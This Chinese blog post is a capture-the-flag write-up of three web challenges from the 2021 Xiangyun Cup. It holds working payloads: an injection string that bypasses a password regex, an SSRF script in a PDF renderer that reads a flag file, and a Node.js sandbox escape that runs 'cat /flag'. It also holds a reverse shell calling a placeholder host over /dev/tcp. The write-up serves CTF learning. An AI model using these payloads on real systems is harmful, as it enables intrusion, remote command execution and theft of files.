---
title: '祥云杯2021 Web'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-10-21 12:52:31
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184447.png
---
## [2021祥云杯]Package Manager 2021
虽然还是看不太懂这种js，但是不影响做题。

根据经验先看routes里的index.ts。发现auth处存在字符串的拼接：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021135626.png)

跟进checkmd5Regex

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021135828.png)

没有匹配开头结尾，也就是在后面拼接内容就可以过正则。

写个脚本跑就行。

	ffffffffffffffffffffffffffffffff"||this.password[0]=="!

## [2021祥云杯]secrets_of_admin
用database.ts里给的admin登录

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021143637.png)

进去是个创建pdf的功能
找一下相关代码：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021144308.png)

继续往下看，是一个读取文件的接口：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021152012.png)

但是superuser被禁用了

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021152044.png)

而flag就是superuser的

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021152121.png)

所以需要把flag给admin，也就是给admin一个文件名，让他文件名不是flag，和路径拼接到一起时又可以读到flag文件，比如./flag。可/api/files那里又需要本地访问，所以需要ssrf。
不熟悉pdf这里的ssrf，google找到了 CVE-2019-15138

	<script>
	var Troy3e = new XMLHttpRequest();Troy3e.open("GET", "http://127.0.0.1:8888/api/files?username=admin&filename=./flag&checksum=123", true);Troy3e.send();
	</script>

过滤了小标签和script，用数组绕过

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021154834.png)

最后访问/api/files/123。

## [2021祥云杯]cralwer_z
index是普通的注册登录，没有利用点。

user.js有profile、verify、bucket三个路由。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021163054.png)

bucket这里会访问user.bucket，大概这就是利用点了。
首先必须满足如下要求

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021170045.png)

跟一下看看是不是可控的。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021163447.png)

显然我们要满足第一个要求是很容易的，但这里不行，也就是这里不会跳转。
但是只有跳转到verify才会更新bucket。

同时，发到verify的token会失效。这说明我们既要满足personalbucket是我们自己的url，也要能满足跳转到verify成功更新bucket。

所以我们先用默认的bucket发一次请求获取到可以被找到的token

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021170947.png)

再用自己的url发一次包

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021171005.png)

最后在第一次发的包那里重定向即可更新bucket，访问/user/bucket即可反弹shell。

读flag

	<script>
	a=this.constructor.constructor.constructor.constructor('return process')();b=a.mainModule.require('child_process');c=b.execSync('cat /flag').toString();document.write(c);
	</script>

弹shell

	<script>c='constructor';this[c][c]("c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i >& /dev/tcp/x.x.x.x/3333 0>&1'],);console.log(ls.output.toString());")()</script>
